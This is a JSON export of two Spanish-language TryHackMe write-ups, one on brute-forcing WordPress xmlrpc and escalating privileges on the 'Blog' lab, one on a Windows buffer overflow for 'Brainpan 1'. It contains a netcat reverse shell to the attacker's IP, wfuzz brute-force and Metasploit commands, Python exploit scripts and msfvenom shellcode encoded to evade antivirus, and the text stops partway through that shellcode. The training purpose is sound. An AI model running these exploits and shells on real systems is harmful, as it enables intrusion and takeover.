[ { "title": "Blog - THM Writeup", "url": "/posts/blog-thm-writeup/", "categories": "cajas", "tags": "thm, wordpress, web, php, reversing, xml, metasploit", "date": "2022-01-14 22:34:00 +0000", "snippet": "Hoy traemos la maquina Blog de TryHackMe en donde segun su misma descripcion indica que esta usando el Sistema de Gestion de Contenido (CMS) muy conocido WordPress el cual tambien tiene una lista extensa de vulnerabilidades pasadas, tambien vemos en sus propios objetivos se nos pide enumerar la version sobre este.Billy Joel made a blog on his home computer and has started working on it. It’s going to be so awesome!Enumerate this box and find the 2 flags that are hiding on it! Billy has some weird things going on his laptop. Can you maneuver around and get what you need? Or will you fall down the rabbit hole…In order to get the blog to work with AWS, you’ll need to add blog.thm to your /etc/hosts file.Una vez logeados, procedemos a iniciar la maquina y agregarle 1 hora mas por si acaso, luego nos conectamos al VPN con sudo openvpn /PATHTO/USER.ovpnCon esto empezamos…RECONOCIMIENTOHacemos un ping -c 1 IP para analizar el TTL de la respuesta a ver si se aproxima a 64 (Linux) o a 128 (Windows), vemos en este caso que es Linux.Escaneamos los puertos abiertos con la herramienta nmap usando opciones que nos aumentaran en cierta medida la velocidad de escaneo: nmap -p- -sS --open --min-rate=600 -vvv -n -Pn -oN puertos.txt 10.10.193.129Con esto vemos todos los puertos TCP -p-, utilizamos un escaneo del tipo TCP SYN Scan, usamos solo listar puertos --open, aumentamos la cantidad minima de paquetes a enviar por segundo con --min-rate=600 con rango entre 100-5000 dependiendo de la conexion existente, con maxima verbosidad -vvv, sin resolucion DNS -n, desactivando el Host Discovery con -Pn y guardando un archivo -oN puertos.txtLanzamos scripts basicos de enumeracion con -sC y deteccion de version -sV para los puertos que se encontraron abiertos, con salida al archivo version.txt. nmap -sC -sV 10.10.193.129 -oN version.txtEncontramos un puerto ssh 22 con el que no podremos hacer mucho si no tenemos credenciales de acceso, un puerto http 80 utilizando el CMS con su version y con esto podriamos responder los primeros objetivos de la maquina, y tambien un servicio smb 139,445 que al parecer podemos acceder como invitado.Empezaremos con este puerto smb haciendo un listado de los recursos compartidos por red con smbclient -L 10.10.56.100 -N para listar con -L y elegir no usar clave de acceso con -NVemos un recurso llamado BillySMB que es sospechoso segun la descripcion de la maquina, asi que procedemos a abrirlo y copiarnos todo el contenido:Usamos prompt para evitar preguntar confirmacion y nos copiamos todo con mget * multiget?A partir de ahi revisamos los archivos pero no encontramos mucho. Al usar steghide vemos que en la imagen Alice-White-Rabbit.jpg existe informacion pero al extraerla nos topamos con un buen rabbit hole que se advertia desde un principio…Asi que al no ver nada interesante, nos centramos en la pagina web, al abrirla vemos un Blog en Wordpress comun, con un par de publicaciones, de las cuales si vemos los autores tenemos dos posibles usuarios de la pagina que son bjoel,kwheel, intentamos logearnos con claves por defecto en el apartado de Login que encontramos en el sitio pero no logramos entrar.Podriamos intentar hacer fuzzing para encontrar rutas y archivos de la pagina, sin embargo notamos un problema de conexion al mandar muchos paquetes, asi que podemos ir manualmente enumerando un poco el WordPress.Podemos validar si existen mas usuarios posibles usando una ruta tipica de WordPress en /wp-json/wp/v2/users, aca encontramos efectivamente un texto en formato JSON con cierta informacion: Podemos hacer uso de la herramienta jq con la cual si pasamos un echo &#39;TEXTOJSON&#39; | jq &quot;.[] | .slug&quot; | tr -d &#39;&quot;&#39; podemos obtener el campo slug del formato JSON y verificamos que solo existen los usuarios bjoel,kwheel que identificamos antes.Seguimos enumerando y encontramos que efectivamente existe el archivo /xmlrpc.php debido a que si hacemos peticion usando burpsuite o curl obtenemos respuesta positiva desde el lado del servidor, aunque pone lo siguiente: XML-RPC server accepts POST requests only.Pues lo unico que debemos hacer aca para poder enumerar ciertas cosas con esta API, podemos hacer uso de burpsuite donde activamos el proxy, interceptamos una actualizacion de esta pagina, nos mandamos la peticion a la opcion Repeater, damos 2do Click y usamos Change request Method para cambiar la peticion a POST, y luego ya solo queda modificar el cuerpo de la peticion, por ejemplo podemos mostrar los metodos disponibles a llamar con:&amp;lt;methodCall&amp;gt; &amp;lt;methodName&amp;gt; system.listMethods &amp;lt;/methodName&amp;gt;&amp;lt;/methodCall&amp;gt;ESCANEOVemos de ultimo en la lista que tenemos disponible el metodo wp.getUsersBlogs con el cual podremos utilizarlo para probar por fuera bruta bruteforce las claves de estos dos usuarios que nos encontramos. Para esto existen diferentes maneras, tenemos burpsuite que con licencia pro hace funcion de Intruder por hilos, tenemos wpscan que tambien tiene un modulo de fuerza bruta, tambien podriamos hacer uso de herramientas de fuzzing como wfuzz, o incluso desde un script en bash usando el paquete curl, sin embargo vemos que esta maquina es altamente susceptible a DoS si se envian muchas peticiones, asi que en este caso tiraremos de wfuzz sin agregar muchos hilos usando lo siguiente: La peticion que se debe enviar para probar una clave es esta&amp;lt;methodCall&amp;gt; &amp;lt;methodName&amp;gt; wp.getUsersBlogs &amp;lt;/methodName&amp;gt; &amp;lt;params&amp;gt; &amp;lt;param&amp;gt; &amp;lt;value&amp;gt; user &amp;lt;/value&amp;gt; &amp;lt;/param&amp;gt; &amp;lt;param&amp;gt; &amp;lt;value&amp;gt; password &amp;lt;/value&amp;gt; &amp;lt;/param&amp;gt; &amp;lt;/params&amp;gt; &amp;lt;/methodCall&amp;gt;Como usuarios, tenemos que crear un archivo que en cada linea tenga un usuario para bjoel, kwheel en un archivo users.txt y como claves usaremos las primeras 5000 claves del archivo rockyou.txt las cuales extraemos con head -n 5000 /usr/share/wordlists/rockyou.txt &amp;gt; dict.txt y una vez tengamos esto usaremos la siguiente instruccion para wfuzzwfuzz -c --hh=403 -w dict.txt -w users.txt -d &quot;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;wp.getUsersBlogs&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;FUZ2Z&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;FUZZ&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; http://blog.thm/xmlrpc.phpCon esto usaremos formato -colorizado, escondemos las respuestas con 403 caracteres (si se quita este comando, apareceran todas las solicitudes con claves incorrectas, usamos este filtro para eliminar esas respuestas especificas), usamos el diccionario -w dict.txt de primero para iterar 1 clave con dos usuarios, y luego el diccionario de -w users.txt, si lo ponemos en orden inverso pues iteraria 1 usuario con todas las claves, y nosotros queremos probar cada clave con cada usuario para agilizar tiempo, luego con -d pasamos la POST data de la peticion xml en una sola linea, poniendo FUZ2Z donde irian nuestro user.txt, y ponemos FUZZ donde irian las claves, y finalmente la URL de peticion, con esto encontramos la clave para kwheel:Una vez tenemos esta clave, podemos probar logearnos en la misma pagina, pero vemos que no tenemos permisos de administrador asi que no podremos hacer mucho, sin embargo existen exploits que requieren de autenticacion inicial para funcionar, por ello vemos si existe algun exploit para la version actual de wordpress con searchsploit wordpress 5.0 y vemos ciertos exploits, pero en este caso nos enfocaremos en el llamado WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit) que es el que aparenta estar operativo. Al ser de Metasploit debemos lanzar el entorno del mismo con msfconsole y esperamos que se active la consola con mucha paciencia.Una vez aca podemos buscar el mismo exploit con search wordpress 5.0 y anotamos el nombre, enviamos use exploit/multi/http/wp_crop_rce y luego debemos completar las opciones del exploit con options, a partir de ahi seteamos el LHOST, LPORT, RHOSTS, USERNAME y PASSWORD con set LHOST 10.8.33.130 por ejemplo:Ya con todo configurado, procemos a escribir exploit y darle enter:Aca ya tenemos ejecucion de comandos de manera remota con el servidor y logramos el acceso inicial, seguimos con la siguiente fase…ESCALADA DE PRIVILEGIOSHemos obtenido acceso con una consola del tipo meterpreter, pero a modo de comodidad pasamos a crearnos una reverse shell con nc como estamos acostumbramos, para ello escribimos shell en meterpreter para ejecutar una consola de sistema operativo, luego nos ponemos en escucha por otra ventana de bash con sudo nc -nvlp 443 y desde la consola del sistema remoto usamos el siguiente metodo de reverse shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.33.130 443 &amp;gt;/tmp/fUna vez obtenemos esta consola remota de bash, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion: script /dev/null -c bash En teclado Ctrl + Z stty raw -echo; fg Escribir reset aunque no se vea xterm en Terminal Type export SHELL=bash export TERM=xtermYa con esto tenemos una consola interactiva con la cual procedemos a seguir investigando en como ganar privilegios de root.Podemos intentar obtener la flag de user.txt que la encontramos en /home/bjoel/user.txt pero nos topamos con que es una burla y no se encuentra alli, vemos un archivo PDF que es una carta de despido para Billy indicando que usaba dispositivos USB lo cual no estaba permitido en esa empresa.Si seguimos buscando formas de obtener credenciales elevadas, al usar find / -perm -4000 2&amp;gt;/dev/null para ver los binarios con SUID, notamos que hay uno que sobresale de la lista, pues esta en una carpeta donde no hay otros binarios SUID, en /usr/sbin/checker, al ejecutarlo solo nos dice que somos admin, pero si usamos ltrace para ejecutarlo vemos que hace uso de la funcion getenv() lo cual intenta buscar una variable de entorno llamada admin:Probamos hacer export admin=&#39;test&#39; y ejecutamos el binario de nuevo y efectivamente ya tenemos acceso root, de aca buscamos donde esta la flag user.txt y leemos la flag de root.txt y concluimos con esta maquina:Saludos!" }, { "title": "Brainpan 1 - THM Writeup", "url": "/posts/brainpan-thm-writeup/", "categories": "cajas", "tags": "thm, bof, windows, escape, reversing", "date": "2022-01-12 14:22:30 +0000", "snippet": "El dia de hoy se presenta una guia o writeup sobre una maquina interesante en la plataforma de TryHackMe la cual segun su propia descripcion indica que se hara un analisis de una vulnerabilidad por desbordamiento de buffer (buffer overflow) de un archivo ejecutable de Windows .exe, lo cual nos prepara de cierta forma para un reto en la certificacion OSCP que es una de las mas demandadas a nivel profesional en el campo de la Ciberseguridad que tanto seguimos, por lo tanto todo esto comprende un reto tambien importante para nosotros al introducirnos en el area profesional del Hacking Etico.Un desbordamiento de bufer se refiere a una anomalia en donde un programa, mientras escribe en los buferes de memoria asignados para ciertas variables o registros, sobrepasa los limites de algun bufer, llegando a escribir en locaciones de memoria adyacentes como se presenta a continuacion:Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. If you get stuck on this machine, don’t give up (or look at writeups), just try harder.Esta caja en particular no utiliza flag de hashes en archivos .txt pero de igual forma completaremos los objetivos segun se vayan logrando los cuales son: Deploy the machine. Gain initial access Escalate your privileges to root.Sin saltarse ninguno antes de realmente completarlo, vamos paso a paso.Una vez logeados, procedemos a iniciar la maquina y agregarle 1 hora mas por si acaso, luego nos conectamos al VPN con sudo openvpn /PATHTO/USER.ovpnAqui ya podemos marcar el primer objetivo como completado, y empezamos…RECONOCIMIENTOComo siempre primero podemos hacer un ping -c 1 IP para determinar el TTL de la respuesta a ver si se acerca a 64 (Linux) o a 128 (Windows), vemos en este caso que es Linux.Luego seguimos con nuestro escaneo con la herramienta nmap para identificar puertos abiertos y mucho mas con: nmap -p- --open -T5 -n -v 10.10.136.187 -oN puertos.txtPara ver todos los puertos TCP -p-, solo listar puertos --open, con velocidad maxima de escaneo -T5, sin resolucion DNS -n, -verbosidad para ver puertos abiertos en salida y guardando un archivo -oN puertos.txtProcedemos a analizar en mas detalle los puertos abiertos pasandoles scripts basicos de enumeracion -sC y deteccion de version -sV, con salida al archivo version.txt. nmap -sC -sV 10.10.137.187 -oN version.txtVemos que existen dos puertos 9999,10000 que buscando en internet lo que es abyss es un protocolo de interfaz de web, asi que los dos deberian ser paginas HTTP, sin embargo al abrir en el navegador nos topamos que solo el puerto http://10.10.136.187:10000/ es el unico que responde a whatweb y a nuestro explorador de internet con sitio estatico sin mucha informacion acerca de la maquina.De resto con el puerto 9999 habiamos visto un banner que se envio a traves de la enumeracion de nmap, asi que podemos entablar una conexion telnet por el puerto especificado a ver que envia el servidor:La conexion al abrirse nos muestra el banner de brainpan, y se queda esperando por una clave que no conocemos, y si es erronea la conexion se cierra. Por los momentos dejaremos este puerto tranquilo y veremos el otro.Podemos hacer fuzzing que es la tecnica que se usa para buscar alguna ruta existente en subdirectorios de la pagina, para ello podemos usar la herramienta gobuster desarrollada en lenguaje Go: gobuster dir -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.137.187:10000/ --no-errorHaciendo uso de su funcion dir con 200 threads -t, usando el diccionario -w directory-list-2.3-medium.txt que es muy usado, pasandole la URL -u con el puerto 10000, y poniendo --no-error para evitar mostrar errores de timeout, vemos que aun sin terminar ya encontro un subdirectorio bin que si lo abrimos en el explorador:Vemos un directory listing donde podemos ver un archivo brainpan.exe, este vamos a descargarlo a nuestra maquina Linux para hacerle analisis y seguimos con la siguiente etapa…ESCANEONos bajamos el archivo brainpan.exe con wget y poniendo la ruta, y usamos file para ver que tipo de binario es:Vemos que es un archivo hecho para Windows en version de 32 bits. En este punto para poder ver que es lo que hace este ejecutable, y para debuggearlo de una mejor forma, nos descargaremos e instalaremos una maquina virtual con Windows 7 32-bits. Yo usare la imagen de Windows 7 SP1 MiniOS7 PRO x86 de Daniel (Doofy) Rodriguez, que tiene un tamaño de archivo menor, es una version mas ligera, tiene una instalacion mas rapida y nos funciona de maravilla para la tarea que vamos a realizar.Una vez tengamos nuestra maquina montada, descargamos e instalamos el Immunity Debugger que es la herramienta de analisis de binarios e ingenieria inversa que se recomienda en el OSCP y es la mas comunmente usada para este tipo de investigacion:En esta maquina requeriremos de desactivar la Data Execution Protection que es el mecanismo que se utiliza a nivel de hardware para marcar la memoria con atributos que indican que la ejecucion de comandos no sea posible en espacios de memoria asignados, con esto desactivado podremos hacer el debug y probar el exploit sin ningun problema. Para desactivar esto necesitamos abrir una consola cmd.exe con permisos de Administrador y enviar el siguiente comando: BCDEDIT /SET {CURRENT} NX ALWAYSOFFUna vez enviado el comando, reiniciamos la maquina Windows y ya la DEP estara desactivada, ahora tenemos que ver la forma de como enviar el archivo brainpan.exe a esta maquina, podemos hacerlo usando impacket-smbserver, python -m http.server o cualquier otro medio, recordando siempre que aca se deben usar las IPs de la red NAT que otorga nuestro software de virtualizacion (aca estamos usando VMWare Workstation Player):Usamos impacket-smbserver ya que el servidor web con python -m http.server dio alertas con Internet Explorer y por no instalar otro explorador, nos quedamos con SMB.Luego abrimos una consola, vamos a la ruta del archivo y lo corremos desde cmd.exe, nos damos cuenta que abre un puerto 9999 esperando por conexion:Y si probamos hacer telnet desde nuestra maquina Linux a este nuevo servidor recibimos el mismo banner anterior y la respuesta es recibida desde la consola Windows:Con esto concluimos que es el mismo servicio abierto en la maquina Brainpan 1 y seguiremos con su analisis a ver de que manera puede ser explotado.Para ello podemos crear un script para hacer fuzzing de desbordamiento a ver si este binario es susceptible a buffer overflow, esto se hara con el siguiente script en Python:#!/usr/bin/pythonimport socket, sys, time #socket para conexiones, sys para pasar argumentos, time para usar sleepif __name__ == &#39;__main__&#39;: ip_addr = sys.argv[1] #Tomamos los valores de IP y Puerto port = int(sys.argv[2]) string = &#39;A&#39; #Caracter a enviar mult = 100 #Multiplicador for i in range(32): try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creando socket, AF_INET representa conexiones IPV4, SOCK_STREAM representa conexion TCP s.settimeout(5) #Si cualquier conexion del socket tarda mas de 5 segundos, salta a error except: s.connect((ip_addr, port)) #Conectando al socket data = s.recv(1024) #Recibiendo data inicial (banner) print(&quot;[*] Enviando&quot;, mult, &quot;caracteres...\\r&quot;, end=&#39;&#39;) #Con retorno y sin salto de linea para sobreescribir en el mismo texto s.send((string*mult).encode(&#39;latin1&#39;)) #Enviando caracteres, usando encoder &#39;latin1&#39; que no modifica los hex codes, python3 lo exije data = s.recv(1024) mult += 100 #Aumento de 100 time.sleep(1) except: print(&quot; [!] Ocurrio un error! Bufer actual en&quot;, mult, &quot;caracteres...&quot;) sys.exit(1)En los comentarios se puede leer la descripcion en cada linea, pero basicamente envia letras ‘A’ de 100 en 100 al socket conectado en el puerto 9999 de la maquina victima. Luego abrimos el proceso brainpan.exe nuevamente desde nuestra maquina Windows 7, y ejecutamos el exploit con python bofexploit.py o ./bofexploit.py si tiene permisos de ejecucion. Con esto vamos a ver como se van a ir enviando los caracteres pero… sorpresa!, vemos como el programa se corrompe al enviar 600 caracteres, esto significa que el programa es susceptible a este tipo de vulnerabilidad.Ya con ello, vamos a nuevamente abrir el proceso brainpan.exe y abrimos nuestro Immunity Debugger que instalamos previamente, luego le damos a File -&amp;gt; Attach para conectarnos con el proceso brainpan.exe (podemos hacer uso del sortear por Name) que ya esta abierto en nuestra consola cmd.exeSin embargo al conectarnos al proceso, este se pondra en estado Paused como se puede observar en la siguiente imagen, con eso debemos darle al boton de Play en la barra de arriba para que el proceso siga corriendo:Luego de eso vamos a nuevamente correr nuestro script desde la maquina Linux y veremos el comportamiento del programa al momento de desbordarse el bufer y tener un error:La letra A representada en hexadecimal (ascii) tiene la forma 0x41, y vemos como dicho valor 41 se repite muchas veces en diferentes registros, esto pasa por lo siguiente: El Stack o Pila en memoria son una serie de espacios en donde se almacena la informacion, como vemos en la imagen, existe un area llamada Buffer Space que es donde el programa guarda ciertos parametros como variables locales, entre otros, siendo en nuestro caso el espacio donde el programa guarda la entrada del usuario por telnet. La forma de escritura de memoria en el caso de la imagen es hacia abajo, vemos como los registros EBP y EIP estan por debajo de la que seria nuestra posicion actual, y el desbordamiento de bufer ocurre cuando sobrepasamos el limite del bufer que seria asignado a nuestra variable, y vamos mas alla llenando los espacios subyacentes.El registro EIP es de extrema importancia, ya que es en donde se define a que instruccion debe saltar el programa en cada paso, si podemos escribir en el, teoricamente podemos dirigir el flujo del programa a nuestra conveniencia. Con esto en mente, debemos buscar una forma de saber cuantos caracteres exactamente necesitamos para llegar a ese registro EIP, ya que en dentro de el no queremos caracteres aleatorios o Aes, necesitamos colocar en el una direccion en el programa que nos sirva para ejecutar comandos remotamente.El concepto aca seria generar una serie de caracteres que no se repitan, enviar el desbordamiento de bufer, y ver que numero se coloca en el EIP para saber en que posicion de la cadena que enviamos es donde se ubicara ese registro.Esto se puede hacer de multiples maneras, por aca lo haremos con gdb-peda, en nuestra maquina Linux utilizamos el comando gdb -q para abrir el GNU Debugger con peda, y luego usamos (no cerrar la ventana de gdb-peda ya que la usaremos mas adelante) pattern create 600Esto nos creara un patron de 600 caracteres (mayor que nuestro buffer overflow) que son unicos en series no repetitivas de 32 bits (4 Bytes = 4 chars), luego nos copiamos esto y debemos enviar nuevamente al servicio brainpan.exe, esto lo podriamos reemplazar en el bufer que se envia por nuestro Script de Python, pero para hacerlo mas sencillo podemos simplemente abrir una nueva sesion de telnet y enviarlo desde alli ya que los caracteres son reconocibles por consola.Para esto hay que primero cerrar el Immunity Debugger si estaba abierto ya con el proceso brainpan asignado, luego volver a abrir el brainpan.exe desde consola, y luego volver a abrir Immunity Debugger y volver a Attach el proceso.Una vez el proceso este activo, enviamos por telnet el patron creado en gdb-peda y vemos nuevamente el EIP que queda alojado en memoria. Vemos que pone un codigo 73413973, este codigo nos lo copiamos y lo ponemos en gdb-peda con el comando patron offset 0x73413973 y nos indica que existe un offset desde el inicio hasta este codigo, de 524 caracteres. Despues de esto la ventana de gdb-peda puede ser cerrada.Ya con esto tenemos el offset que necesitamos enviar antes de llegar al registro EIP, la idea ahora es enviar los 524 caracteres primarios del offset, luego enviar el EIP que son 4 caracteres mas, y luego de esto enviaremos nuestro payload (que al ver la respuesta del servidor, vemos que el restante de la cadena luego de los primeros 528 caracteres, se guardan en el registro ESP) con el objetivo final de obtener una reverse shell (consola remota) a nuestro equipo, sin embargo no es tan sencillo como colocar el EIP apuntando a la direccion de memoria donde estara el payload, pues existen 2 inconvenientes: En ciertos binarios existen caracteres que no son correctamente interpretados por el computador, estos son llamados bar chars o caracteres malos, es necesario encontrar y evitar el uso de estos bad chars en la creacion del payload de explotacion. No se puede apuntar directamente con el EIP hacia el registro donde se esta guardando el resto de nuestro payload que seria el registro ESP, apuntar a su direccion directamente nos llevaria a un error de ejecucion.Para resolver el primer problema, retocaremos nuestro script en Python para mandar: 524 chars (offset) + 4 chars (EIP) + bytearray donde bytearray seran todos los numeros hexadecimales de 16 bits, es decir, desde el 0x00 hasta el 0xFF o \\xFF. Para crear esta cadena de bytes automaticamente podemos hacer uso de mona.py que es un tipo de “plug-in” para Immunity Debugger, seguimos los pasos para su instalacion y procedemos a usarlo de la siguiente manera:Maximizamos Immunity Debugger y en la linea de entrada de comandos de abajo introducir el siguiente comando para crear la carpeta de trabajo que mona.py usara (en mi caso decidi C:\\brainpan): !mona config -set workingfolder C:\\%pLuego ya que tenemos la carpeta definida, utilizamos la funcion !mona bytearray para crear la cadena de bytes de la siguiente forma:!mona bytearray -cpb \\x00Donde -cpb \\x00 es para no colocar el bad char 0x00 que ya se sabe debe ignorarse. Esto creara en la carpeta configurada anteriormente dos archivos bytearray.bin y bytearray.txt que el archivo de texto lo pasaremos a nuestra maquina para copiar el array, y el .bin lo usaremos mas adalante para comparar si hay algun bad char o no.Una vez copiado el archivo bytearray.txt a nuestra maquina Linux (se hace con impacket-smbserver de nuevo) podemos hacer uso de grep y xclip para copiar el contenido: grep ^\\&quot; bytearray.txt | xclip -sel clipY luego retocamos nuetro script para incluir estos bytes luego de la posicion del EIP:#!/usr/bin/pythonimport socket, sys, timeif __name__ == &#39;__main__&#39;: ip_addr = sys.argv[1] port = int(sys.argv[2]) offset = &#39;A&#39;*524 eip = &#39;B&#39;*4 command = (&quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20&quot;&quot;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40&quot;&quot;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60&quot;&quot;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80&quot;&quot;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0&quot;&quot;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0&quot;&quot;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0&quot;&quot;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff&quot;) payload = offset + eip + command try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(5) s.connect((ip_addr, port)) data = s.recv(1024) print(&quot;[*] Enviando payload...&quot;) s.send((payload).encode(&#39;latin1&#39;)) data = s.recv(1024) except: print(&quot;\\n [!] Ocurrio un error!&quot;) sys.exit(1)Al enviar el script:Vemos como efectivamente el EIP se muestra como 42424242 que significa BBBB, y justo despues de este viene el stack ESP en donde vemos todo nuestro bytearray desde 0x01 hasta 0xFF, es ciertamente ineficiente revisar caracter por caracter, asi que haremos uso de mona.py nuevamente donde tiene una funcion que hace esto por nosotros. Solo es ejecutar la siguiente linea: !mona compare -f C:\\brainpan\\bytearray.bin -a 0x0022F930Comparamos el bytearray que creamos anteriormente con todo lo que viene a continuacion del ESP (0x0022F930) y esto nos devuelve una ventana donde no se presenta ningun bad charEs decir que solo tenemos el \\x00 como bad char, en caso de que existiese otro solo mostraria uno solo, por lo tanto habria que recrear el bytearray excluyendo ese otro badchar con la forma -cpb \\x00\\x?? y repetir todo el proceso, asi consecutivamente hasta que no nos muestre ningun bad char al hacer un !mona compareYa con esto resolvemos el primer problema, ahora para el segundo tenemos lo siguiente:Como no se puede apuntar directamente el EIP el stack ESP que es donde se deposita nuestro payload, debemos buscar una funcion en el mismo brainpan.exe que haga un salto al ESP jmp esp, de esta forma hariamos un salto indirecto hacia nuestro payload. Para encontrar un jmp esp dentro del programa, primero debemos buscar cual es el Operation Code (opcode) de jmp esp y lo logramos haciendo Ctrl + F dentro de Immunity Debugger.Con eso vemos el codigo es FFE4, no debemos prestarle atencion a la direccion a la izquierda ya que esta varia y no funcionara si la ponemos en el EIP, en cambio podemos usar mona.py para ubicar donde se encontraria un jmp esp usable para esto, y lo hacemos con: !mona modules para saber que modulo debemos usar (brainpan.exe) !mona -m brainpan.exe -s \\xFF\\xE4 para ubicar el pointer deseadoVemos como el pointer jmp esp se ubica en la direccion 0x311712F3, este seria finalmente nuestro EIP deseado, que hara una redireccion al ESP donde meteremos nuestro payload al culminar. Al momento de configurar esta direccion en el script de Python, es necesario saber que el EIP especificamente debe venir en formato Little Endian, para esto solo hay que invertir la posicion de los bytes, es decir que nuestra variable quedaria como eip = &quot;\\xf3\\x12\\x17\\x31&quot;.Ahora solo resta crear un payload en formato shell que permita ejecutar acciones a bajo nivel que nos permita obtener una consola remota desde la maquina victima hacia nuestra maquina de atacante. Esto lo podremos lograr con la herramienta msfvenom del metasploit framework, que nos permite crear un payload rapidamente sin tener que estar inmersos en el entorno de metasploit.Para nuestra maquina de pruebas utilizarmos el payload windows/shell_reverse_tcp que ejecuta una consola con conexion inversa a nosotros, para ello ejecutamos el comandomsfvenom -p windows/shell_reverse_tcp --platform windows -a x86 -f python -v command LHOST=192.168.132.128 LPORT=443 EXITFUNC=thread -b &#39;\\x00&#39; -e x86/shikata_ga_nai` En donde usamos el -payload requerido, marcamos la --platform y su -arquitectura, usamos el -formato python con la -variable commmand, usamos LHOST / LPORT de nuestra maquina de atacante, marcamos los bad chars -b, y finalmente usamos el -encoder shikata_ga_nai para ofuscar nuestro comando y evitar detecciones de antimalwares.Copiamos estas lineas quitando la letra b en b&quot;\\xxx\\xxx...&quot; para quedarnos con variables en str y no en bytes ya que se codifican luego con latin1. Reemplazamos nuestra variable command y tambien agregamos nops = &quot;\\x90&quot;*20, los NOPs son operaciones nulas en la ejecucion de comando, es decir, no hacer nada, estas no-instrucciones las ponemos antes de los comandos del payload, esto porque estos comandos van codificados con shikata_ga_nai y pueden tomar un tiempo en decodificarse, por lo que si no se espera y se pasa directo a la ejecucion de este, puede haber mala interpretacion del codigo.Nuestro script bofexploit.py queda finalmente estructurado de la siguiente manera#!/usr/bin/pythonimport socket, sys, timeif __name__ == &#39;__main__&#39;: ip_addr = sys.argv[1] port = int(sys.argv[2]) offset = &#39;A&#39;*524 eip = &quot;\\xf3\\x12\\x17\\x31&quot; nops = &quot;\\x90&quot;*20 command = &quot;&quot; command += &quot;\\xb8\\xad\\x3d\\x78\\xbb\\xda\\xc9\\xd9\\x74\\x24\\xf4\\x5f&quot; command += &quot;\\x31\\xc9\\xb1\\x52\\x31\\x47\\x12\\x03\\x47\\x12\\x83\\x6a&quot; command += &quot;\\x39\\x9a\\x4e\\x88\\xaa\\xd8\\xb1\\x70\\x2b\\xbd\\x38\\x95&quot; command += &quot;\\x1a\\xfd\\x5f\\xde\\x0d\\xcd\\x14\\xb2\\xa1\\xa6\\x79\\x26&quot; command += &quot;\\x31\\xca\\x55\\x49\\xf2\\x61\\x80\\x64\\x03\\xd9\\xf0\\xe7&quot; command += &quot;\\x87\\x20\\x25\\xc7\\xb6\\xea\\x38\\x06\\xfe\\x17\\xb0\\x5a&quot; command += &quot;\\x57\\x53\\x67\\x4a\\xdc\\x29\\xb4\\xe1\\xae\\xbc\\xbc\\x16&quot; command += &quot;\\x66\\xbe\\xed\\x89\\xfc\\x99\\x2d\\x28\\xd0\\x91\\x67\\x32&quot; command += &quot;\\x35\\x9f\\x3e\\xc9\\x8d\\x6b\\xc1\\x1b\\xdc\\x94\\x6e\\x62&quot; command += &quot;\\xd0\\x66\\x6e\\xa3\\xd7\\x98\\x05\\xdd\\x2b\\x24\\x1e\\x1a&quot; command += &quot;\\x51\\xf2\\xab\\xb8\\xf1\\x71\\x0b\\x64\\x03\\x55\\xca\\xef&quot; command += &quot;\\x0f\\x12\\x98\\xb7\\x13\\xa5\\x4d\\xcc\\x28\\x2e\\x70\\x02&quot; command += &quot;\\xb9\\x74\\x57\\x86\\xe1\\x2f\\xf6\\x9f\\x4f\\x81\\x07\\xff&quot; command += &quot;\\x2f\\x7e\\xa2\\x74\\xdd\\x6b\\xdf\\xd7\\x8a\\x58\\xd2\\xe7&quot; command += 